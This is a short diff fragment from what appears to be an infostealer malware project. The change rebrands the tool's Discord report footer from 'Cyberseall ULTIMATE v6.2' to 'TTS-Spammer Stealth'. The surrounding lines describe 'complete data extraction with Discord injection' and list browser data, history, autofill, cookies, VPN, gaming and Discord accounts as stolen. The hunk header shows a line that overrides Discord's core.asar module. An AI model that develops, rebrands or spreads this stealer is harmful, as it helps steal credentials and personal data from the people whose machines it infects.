@@ -2506,7 +2506,7 @@ module.exports = require('./core.asar');
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.2 - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "TTS-Spammer Stealth - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
